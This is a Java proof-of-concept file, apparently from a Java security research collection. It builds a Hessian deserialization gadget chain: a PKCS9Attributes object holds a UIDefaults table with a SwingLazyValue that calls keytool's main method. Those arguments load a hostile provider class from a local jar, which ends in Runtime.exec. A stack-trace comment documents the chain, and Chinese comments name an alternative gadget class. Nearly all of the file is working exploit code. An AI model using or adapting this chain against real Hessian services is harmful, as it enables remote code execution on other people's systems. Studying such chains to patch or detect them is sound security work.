package com.javasec.pocs.hessian;

import com.javasec.utils.SerializeUtils;
import sun.security.pkcs.PKCS9Attribute;
import sun.security.pkcs.PKCS9Attributes;
import sun.swing.SwingLazyValue;

import javax.swing.*;

/**
 * exec:347, Runtime (java.lang)
 * <clinit>:8, evil (com.javasec.pocs.rce)
 * newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)
 * newInstance:62, NativeConstructorAccessorImpl (sun.reflect)
 * newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)
 * newInstance:422, Constructor (java.lang.reflect)
 * newInstance:442, Class (java.lang)
 * doCommands:678, Main (sun.security.tools.keytool)
 * run:340, Main (sun.security.tools.keytool)
 * main:333, Main (sun.security.tools.keytool)
 * invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
 * invoke:62, NativeMethodAccessorImpl (sun.reflect)
 * invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
 * invoke:497, Method (java.lang.reflect)
 * createValue:73, SwingLazyValue (sun.swing)
 * getFromHashtable:216, UIDefaults (javax.swing)
 * get:161, UIDefaults (javax.swing)
 * getAttribute:265, PKCS9Attributes (sun.security.pkcs)
 * toString:334, PKCS9Attributes (sun.security.pkcs)
 * valueOf:2994, String (java.lang)
 * append:131, StringBuilder (java.lang)
 * expect:2865, Hessian2Input (com.caucho.hessian.io)
 * readString:1407, Hessian2Input (com.caucho.hessian.io)
 * readObjectDefinition:2163, Hessian2Input (com.caucho.hessian.io)
 * readObject:2105, Hessian2Input (com.caucho.hessian.io)
 * HessianDeserial:244, SerializeUtils (com.javasec.utils)
 * main:18, HessianPLVloadJar (com.javasec.pocs.hessian)
 */
public class HessianPLVloadJar {
    public static void main(String[] args) throws Exception {
        //Pkcs9可以换成MimeTypeParameterList
        PKCS9Attributes pkcs9Attributes = SerializeUtils.createWithoutConstructor(PKCS9Attributes.class);
        UIDefaults uiDefaults = new UIDefaults();
        //PKCS9Attribute.EMAIL_ADDRESS_OID 是固定的，调试流程可以看到逻辑
        uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID, new SwingLazyValue("sun.security.tools.keytool.Main", "main", new Object[]{new String[]{"-LIST","-provider:","com.javasec.pocs.rce.evil","-keystore","NONE","-providerpath","E:\\exp.jar"}}));
        SerializeUtils.setFieldValue(pkcs9Attributes,"attributes",uiDefaults);
        SerializeUtils.HessianDeserial(SerializeUtils.HessianTostringSerial(pkcs9Attributes));
    }

}
